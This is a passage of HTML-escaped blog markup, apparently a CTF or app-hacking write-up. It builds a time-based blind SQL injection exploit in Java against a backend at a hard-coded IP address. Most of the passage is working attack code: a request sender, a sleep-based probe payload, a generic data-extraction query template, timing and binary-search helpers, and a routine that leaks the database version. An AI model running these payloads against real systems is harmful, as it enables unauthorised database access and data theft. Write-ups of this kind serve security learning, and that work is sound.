class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kd\"\u003estatic\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"nf\"\u003esendCommand\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003eusername\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003epassword\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003ecmd\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003etmp\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e   \n        \u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n            \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eusername\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003epassword\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;cmd\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ecmd\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e \u003cspan class=\"n\"\u003etmp\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;temp\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etmp\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nf\"\u003esend\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\n    \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kd\"\u003estatic\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"nf\"\u003esend\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eObject\u003c/span\u003e \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ebuildPayload\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"no\"\u003eURL\u003c/span\u003e \u003cspan class=\"n\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"no\"\u003eURL\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;http://35.243.186.41\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"nc\"\u003eHttpURLConnection\u003c/span\u003e \u003cspan class=\"n\"\u003econ\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eHttpURLConnection\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eopenConnection\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n            \u003cspan class=\"n\"\u003econ\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetRequestMethod\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;POST\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\n            \u003cspan class=\"nc\"\u003eMap\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003eparameters\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eHashMap\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u0026gt;();\u003c/span\u003e\n            \u003cspan class=\"n\"\u003eparameters\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;d\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"o\"\u003e...\u003c/span\u003e\n            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eparseNetworkResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003econtent\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003etoString\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo we are now able to send commands to the backend using the above \u003ccode\u003esendCommand\u003c/code\u003e method. My first bet here was to try some SQL Injection. But we have some limitations as the server only returns \u0026quot;Invalid username or password\u0026quot; or \u0026quot;Unknown\u0026quot;. First message is received when there is no error but the username and password does not match and the last when something went wrong. With this restriction, we could try two approaches: Time-Based Blind SQL Injection or Error-Based Blind SQL Injection. Let\u0026#39;s try time based with the simplest payload:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eout\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eprintln\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esendCommand\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026#39;||sleep(10)#\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e// After 10 seconds ...\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e// {\u0026quot;success\u0026quot;: false, \u0026quot;error\u0026quot;: \u0026quot;Invalid username or password\u0026quot;}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"time-based-sql-injection\"\u003eTime Based SQL Injection\u003c/h3\u003e\n\n\u003cp\u003eWhat? Did we get it? 10 seconds to get a reponse from the payload above! This is definitely my lucky day ... What I could do now? Maybe a tamper for SQLMap [9]? No, no! This is not so 31337! Let\u0026#39;s create our own exploit for blind SQL injection... in Java! First of all, we need to somehow compare two chars and based on response time determine a boolean value: True or False. We can achieve this as follows:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e    \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kd\"\u003estatic\u003c/span\u003e \u003cspan class=\"kt\"\u003eboolean\u003c/span\u003e \u003cspan class=\"nf\"\u003eblindBoolean\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kt\"\u003elong\u003c/span\u003e \u003cspan class=\"n\"\u003estartTime\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003enanoTime\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n\n    \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esendCommand\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\n    \u003cspan class=\"kt\"\u003elong\u003c/span\u003e \u003cspan class=\"n\"\u003eendTime\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003enanoTime\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"kt\"\u003elong\u003c/span\u003e \u003cspan class=\"n\"\u003etimeElapsed\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eendTime\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"n\"\u003estartTime\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e     \n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etimeElapsed\u003c/span\u003e \u003cspan class=\"o\"\u003e/\u003c/span\u003e \u003cspan class=\"mi\"\u003e1000000\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eTIME_TO_WAIT\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e1000\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e    \n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTo measure response time we get the time before and after call \u003ccode\u003esendCommand\u003c/code\u003e then we subtract and compare \u003ccode\u003eTIME_TO_WAIT\u003c/code\u003e with the elapsed time. If elapsed time is greater than \u003ccode\u003eTIME_TO_WAIT\u003c/code\u003e we have a True boolean value otherwise a False value.\u003c/p\u003e\n\n\u003cp\u003eNow we need an abstract query for general purpose that allows us to extract data from the database:\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003e\u0026#39;||(IF((SELECT ascii(substr(column,{1},1)) from table limit {2},1){3}{4},SLEEP({5}),1))#\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003ewith:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{1} -\u0026gt; %d -\u0026gt; string char position\n{2} -\u0026gt; row offset. Limited to 1 result per query\n{3} -\u0026gt; %c -\u0026gt; comparison operator ( =, \u0026gt;, \u0026lt;)\n{4} -\u0026gt; %d -\u0026gt; ascii code value\n{5} -\u0026gt; %d -\u0026gt; time to sleep\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAlso to improve the performance we could use a binary search algorithm [5] for our time based boolean check:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e    \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kd\"\u003estatic\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"nf\"\u003eblindString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003einjection\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003elen\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e  \n        \u003cspan class=\"nc\"\u003eStringBuilder\u003c/span\u003e \u003cspan class=\"n\"\u003evalue\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eStringBuilder\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"k\"\u003efor\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003ec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e \u003cspan class=\"n\"\u003ec\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;=\u003c/span\u003e \u003cspan class=\"n\"\u003elen\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e \u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"o\"\u003e++)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003elow\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e10\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003ehigh\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e126\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"kt\"\u003eint\u003c/span\u003e \u003cspan class=\"n\"\u003eort\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003elow\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"n\"\u003ehigh\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e \u003cspan class=\"n\"\u003elow\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003ehigh\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e \u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"n\"\u003eort\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003elow\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e \u003cspan class=\"n\"\u003elow\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003ehigh\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e \u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"n\"\u003eort\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003elow\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"n\"\u003eort\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003elow\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"n\"\u003ehigh\u003c/span\u003e\u003cspan class=\"o\"\u003e)/\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\n            \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eformat\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einjection\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"sc\"\u003e\u0026#39;=\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eort\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eTIME_TO_WAIT\u003c/span\u003e \u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindBoolean\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"n\"\u003evalue\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eappend\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e \u003cspan class=\"nc\"\u003eCharacter\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003etoString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"n\"\u003eort\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e\n                \u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n                \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n            \u003cspan class=\"n\"\u003epayload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eformat\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einjection\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ec\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"sc\"\u003e\u0026#39;\u0026gt;\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eort\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eTIME_TO_WAIT\u003c/span\u003e \u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindBoolean\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003epayload\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"n\"\u003elow\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eort\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n                \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"n\"\u003ehigh\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eort\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003evalue\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003etoString\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eEverything seems fine enough to start leaking some data:\u003c/p\u003e\n\n\u003ch3 id=\"database-recon\"\u003eDatabase recon\u003c/h3\u003e\n\n\u003ch4 id=\"version\"\u003eversion()\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e    \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kd\"\u003estatic\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"nf\"\u003eblindVersion\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003einjection\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;\u0026#39;||(IF((SELECT ascii(substr(version(),%d,1)))%c%d,SLEEP(%d),1))#\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eblindString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003einjection\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e25\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e// 10.1.37-MariaDB\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch4 id=\"database\"\u003edatabase()\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e    